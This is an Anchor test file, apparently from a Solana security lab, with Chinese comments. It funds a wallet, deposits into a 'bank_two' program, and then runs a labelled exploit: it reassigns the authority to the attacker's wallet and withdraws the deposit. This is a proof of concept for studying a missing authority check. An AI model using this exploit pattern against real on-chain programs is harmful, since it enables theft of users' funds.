import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { BankTwo } from "../target/types/bank_two";

describe("bank_two", () => {
   // Configure the client to use the local cluster.
    const provider = anchor.AnchorProvider.env();
    const connection = provider.connection;
    const wallet = provider.wallet as anchor.Wallet;
    anchor.setProvider(provider);
  
    const program = anchor.workspace.BankTwo as Program<BankTwo>;
    //   因为我们要改变一个权威
    // 从一个钱包到另一个钱包,漏洞利用展示
    //  创建了钱包密钥对要对其签名，因为它无法做
    const authority = anchor.web3.Keypair.generate();
    // 转移一笔钱
    const amount = 1_000_000;
    // 转账之前，我们要提取我们的转账金额
    // 是为了能执行交易
    before(async () => {
      // 在转账之前，我们要确定 钱包里面有钱
      const walletBalance = await connection.getBalance(wallet.publicKey);
      console.log("walletBalance", walletBalance);
      const authorityBalanceNew = await connection.getBalance(authority.publicKey);
      console.log("authorityBalance", authorityBalanceNew);
  
  
      const transferAmount = 1 * anchor.web3.LAMPORTS_PER_SOL;
      // 为新钱包提供金额 
      const tx = new anchor.web3.Transaction().add(
        anchor.web3.SystemProgram.transfer({
          fromPubkey: provider.wallet.publicKey,
          toPubkey: authority.publicKey,
          lamports: transferAmount,
        })
      );
      const signature = await provider.sendAndConfirm(tx);
      console.log("signature", signature);
      
      
      const authorityBalance = await connection.getBalance(authority.publicKey);
      console.log("authorityBalance", authorityBalance);
  
    });
    // 存款
    it("deposit", async () => {
      // 存款
      const transaction  = await program.methods
      .deposit(new anchor.BN(amount))
      .accounts({
        authority: authority.publicKey,      
      }).transaction();
      // 发送交易
      const signature = await anchor.web3.sendAndConfirmTransaction(
        connection,
        transaction,
        [authority],
        {
          skipPreflight: true,
          commitment: "confirmed",
        }
      );
      console.log("signature", signature);
  
      // 我们必须拥有更新权限
      // 这将是我的钱包
      // 我的钱包将成为剥削者
      // 我们必须深度退款

      const updateAuthorityInstruction = await program.methods
      .updateAuthority()
      .accounts({        
        newAuthority: wallet.publicKey,
      }).instruction();
      // 创建提款指指令
      const withdrawInstruction = await program.methods
      .withdraw(new anchor.BN(amount))
      .accounts({
        authority: wallet.publicKey,
      }).instruction();

      // 创建交易
      const exploitTransaction = new anchor.web3.Transaction().add(
        updateAuthorityInstruction,
        withdrawInstruction
      );
      // 发送交易
      const exploitSignature = await anchor.web3.sendAndConfirmTransaction(
        connection,
        exploitTransaction,
        [wallet.payer],
        {
          skipPreflight: true,
          commitment: "confirmed",
        }
      );
      console.log("exploitSignature", exploitSignature);
      
  
    });
});
